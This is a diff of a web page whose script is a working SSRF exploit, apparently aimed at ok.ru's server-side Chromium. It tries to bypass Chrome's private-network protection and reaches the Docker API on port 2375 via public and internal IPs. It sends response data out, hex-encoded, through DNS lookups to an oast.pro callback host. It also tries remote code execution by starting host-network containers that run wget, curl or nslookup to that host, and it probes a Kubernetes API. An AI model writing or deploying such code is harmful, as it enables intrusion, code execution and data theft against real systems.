@@ -4,9 +4,12 @@
 <body>
 <script>
 'use strict';
-// ok.ru Chromium SSRF — probe v5
-// Goal: bypass Chrome PNA by targeting Docker API via Chromium's OWN public IP
-// (public→public = no PNA preflight; from inside the host, Docker on 0.0.0.0:2375 may respond)
+// ok.ru Chromium SSRF — probe v6 (deployed as v5 URL)
+// Key new ideas:
+//   A) WebSocket to Docker API: WS doesn't enforce CORS body restriction → CAN READ response data
+//   B) Host-network containers: uses host's internet access directly (no NAT/bridge firewall)
+//   C) Multiple images: busybox/alpine/ubuntu/debian/node
+//   D) Public IP bypass (from v5): public→public avoids Chrome PNA
 
 const OOB = 'd9kjf7b6b8m9jk7s693gjsxj13ripi6b4.oast.pro';
 const T0 = Date.now();
@@ -31,7 +34,7 @@ const errCode = (e) => {
   return n.substring(0,4).toLowerCase();
 };
 
-// CORS mode — can read response body; 'cors' error = server responded without CORS headers (server IS up!)
+// CORS fetch — 'cors' error = server responded; body exfiltrated via DNS if readable
 const probe = async (lp, url, ms = 6000) => {
   const t0 = Date.now();
   try {
@@ -40,7 +43,6 @@ const probe = async (lp, url, ms = 6000) => {
     const elapsed = Date.now() - t0;
     const snip = body.substring(0, 8).replace(/[^a-z0-9]/gi,'').toLowerCase().substring(0,8);
     dnsOob(`${lp}-ok-${r.status}-${elapsed}ms-${snip}`);
-    // exfil body chunks via DNS
     if (body.length > 0) {
       const hex = Array.from(new TextEncoder().encode(body.substring(0, 120)))
         .map(b => b.toString(16).padStart(2,'0')).join('');
@@ -51,7 +53,7 @@ const probe = async (lp, url, ms = 6000) => {
   }
 };
 
-// no-cors mode — no PNA preflight for public targets; POST body delivered without CORS preflight
+// no-cors POST — delivers body without preflight; nc-ok = any HTTP response received
 const ncProbe = async (lp, url, method = 'GET', body = null, ms = 6000) => {
   const t0 = Date.now();
   const opts = { method, mode: 'no-cors', signal: AbortSignal.timeout(ms) };
@@ -64,10 +66,53 @@ const ncProbe = async (lp, url, method = 'GET', body = null, ms = 6000) => {
   }
 };
 
-(async () => {
-  dnsOob(`exec-v5-${clean(navigator.userAgent.substring(0,40))}`);
+// WebSocket probe — WS onmessage CAN read cross-origin data (no CORS body restriction)
+const wsProbe = (lp, wsUrl, ms = 8000) => new Promise(resolve => {
+  let done = false;
+  const finish = (tag) => { if (!done) { done = true; dnsOob(tag); resolve(); } };
+  try {
+    const ws = new WebSocket(wsUrl);
+    const timer = setTimeout(() => { ws.close(); finish(`${lp}-ws-time`); }, ms);
+    ws.onopen = () => { dnsOob(`${lp}-ws-open`); };
+    ws.onmessage = (e) => {
+      clearTimeout(timer);
+      const d = (typeof e.data === 'string' ? e.data : '').substring(0, 100);
+      dnsOob(`${lp}-ws-msg-${clean(d)}`);
+      // Exfil first 80 chars of WS message via DNS (actual Docker data!)
+      if (d.length > 0) {
+        const hex = Array.from(new TextEncoder().encode(d.substring(0,80)))
+          .map(b => b.toString(16).padStart(2,'0')).join('');
+        (hex.match(/.{1,50}/g) || []).forEach((c,i) => dnsOob(`${lp}-wd${i}-${c}`));
+      }
+      ws.close();
+      finish(`${lp}-ws-done`);
+    };
+    ws.onerror = () => finish(`${lp}-ws-err`);
+    ws.onclose = (e) => finish(`${lp}-ws-cls-${e.code}`);
+  } catch(e) {
+    finish(`${lp}-ws-exc-${errCode(e)}`);
+  }
+});
 
-  // ── Step 1: Discover our public IP ───────────────────────────────────────
+// Try container create+start with a given image; use host network for OOB
+const tryRce = async (ip, img, lp) => {
+  const safeName = `rce6-${img.replace(/[^a-z0-9]/g,'').substring(0,10)}`;
+  const oobLabel = `v6rce-${img.replace(/[^a-z0-9]/g,'').substring(0,10)}`;
+  const createBody = JSON.stringify({
+    Image: img,
+    // sh -c fallback: try wget, curl, or nslookup for OOB
+    Cmd: ['sh', '-c', `wget -q -T 5 "http://${oobLabel}.${OOB}/" 2>/dev/null || curl -sk "http://${oobLabel}.${OOB}/" 2>/dev/null; nslookup "${oobLabel}.${OOB}" 2>/dev/null`],
+    HostConfig: { NetworkMode: 'host' }  // host network = host's internet access
+  });
+  await ncProbe(`${lp}-cr`, `http://${ip}:2375/containers/create?name=${safeName}`, 'POST', createBody, 8000);
+  await new Promise(r => setTimeout(r, 300));
+  await ncProbe(`${lp}-st`, `http://${ip}:2375/containers/${safeName}/start`, 'POST', '', 8000);
+};
+
+(async () => {
+  dnsOob(`exec-v6-${clean(navigator.userAgent.substring(0,40))}`);
+
+  // ── Step 1: Get Chromium's public IP ─────────────────────────────────────
   let myIP = null;
   try {
     const r = await fetch('https://api.ipify.org/?format=text', { signal: AbortSignal.timeout(10000) });
@@ -75,54 +120,50 @@ const ncProbe = async (lp, url, method = 'GET', body = null, ms = 6000) => {
     dnsOob(`myip-${myIP.replace(/\./g,'-')}`);
   } catch(e) {
     dnsOob(`myip-err-${errCode(e)}`);
-    // fallback IP service
     try {
       const r2 = await fetch('https://checkip.amazonaws.com/', { signal: AbortSignal.timeout(10000) });
       myIP = (await r2.text()).trim();
       dnsOob(`myip2-${myIP.replace(/\./g,'-')}`);
-    } catch(e2) {
-      dnsOob(`myip2-err-${errCode(e2)}`);
+    } catch(e2) { dnsOob(`myip2-err-${errCode(e2)}`); }
+  }
+
+  // Work with both IPs: private (172.17.0.1) and public (bypasses PNA)
+  const targets = [];
+  if (myIP) targets.push({ ip: myIP, tag: 'pub' });
+  targets.push({ ip: '172.17.0.1', tag: 'priv' });
+
+  for (const { ip, tag } of targets) {
+    dnsOob(`v6-start-${tag}`);
+
+    // ── Step 2: Probe Docker /_ping ──────────────────────────────────────
+    await probe(`${tag}-dp`, `http://${ip}:2375/_ping`, 8000);
+
+    // ── Step 3: WebSocket to Docker /events — reads cross-origin data! ──
+    // Docker /events is a streaming endpoint; WS upgrade may be accepted
+    await wsProbe(`${tag}-ev`, `ws://${ip}:2375/events`, 7000);
+
+    // ── Step 4: Read /containers/json and /images/json ────────────────
+    await probe(`${tag}-cj`, `http://${ip}:2375/containers/json?all=1`, 8000);
+    await probe(`${tag}-ij`, `http://${ip}:2375/images/json`, 8000);
+    await probe(`${tag}-ver`, `http://${ip}:2375/version`, 8000);
+
+    // ── Step 5: RCE — try multiple images with host networking ─────────
+    const images = ['busybox', 'alpine', 'ubuntu', 'debian', 'python3', 'node', 'curl'];
+    for (let i = 0; i < images.length; i++) {
+      await tryRce(ip, images[i], `${tag}-${i}`);
+      await new Promise(r => setTimeout(r, 500));
     }
+
+    // Wait for container wget/nslookup (host net = host OOB access)
+    await new Promise(r => setTimeout(r, 10000));
+    dnsOob(`v6-rce-wait-${tag}-done`);
+
+    // ── Step 6: K8s API ──────────────────────────────────────────────────
+    await probe(`${tag}-kapi`, `http://${ip}:8080/api`, 7000);
+    await probe(`${tag}-kver`, `http://${ip}:8080/version`, 7000);
   }
 
-  if (myIP) {
-    // ── Step 2: Docker API via our OWN public IP (public→public = NO PNA) ──
-    // 2A: CORS GET /_ping — 'cors' error means Docker IS running and responded (no CORS headers)
-    //                        'te-ff' means no response (same as from external), 'time' means timeout
-    await probe(`v5dp`, `http://${myIP}:2375/_ping`, 8000);
-
-    // 2B: no-cors GET /_ping — additional confirmation; 'nc-ok' = opaque success = Docker responded
-    await ncProbe('v5dp-nc', `http://${myIP}:2375/_ping`, 'GET', null, 8000);
-
-    // 2C: CORS GET /containers/json — try to read running containers list
-    //     even if Chrome blocks body (cors error), this proves the request reached Docker
-    await probe(`v5cjson`, `http://${myIP}:2375/containers/json`, 8000);
-
-    // 2D: no-cors POST /containers/create (RCE attempt via public IP — no preflight in no-cors mode)
-    const createBody = JSON.stringify({
-      Image: 'busybox',
-      Cmd: ['wget', '-q', '-T', '5', `http://v5rce.${OOB}/`],
-      HostConfig: { NetworkMode: 'bridge' }
-    });
-    await ncProbe('v5cr', `http://${myIP}:2375/containers/create?name=rce-v5`, 'POST', createBody, 8000);
-    await new Promise(r => setTimeout(r, 300));
-
-    // 2E: no-cors POST /containers/rce-v5/start
-    await ncProbe('v5st', `http://${myIP}:2375/containers/rce-v5/start`, 'POST', '', 8000);
-
-    // Wait for busybox wget to run and hit OOB (wget has -T 5 timeout)
-    await new Promise(r => setTimeout(r, 9000));
-    dnsOob('v5-rce-wait-done');
-
-    // ── Step 3: K8s insecure API via public IP ────────────────────────────
-    await probe(`v5kapi`, `http://${myIP}:8080/api`, 7000);
-    await probe(`v5kver`, `http://${myIP}:8080/version`, 7000);
-  }
-
-  // ── Step 4: Confirm private Docker still reachable (PNA timing baseline) ─
-  await ncProbe('v5-priv-dp', 'http://172.17.0.1:2375/_ping', 'GET', null, 7000);
-
-  dnsOob(`done-v5-${Date.now()-T0}ms`);
+  dnsOob(`done-v6-${Date.now()-T0}ms`);
 })();
 </script>
 </body>
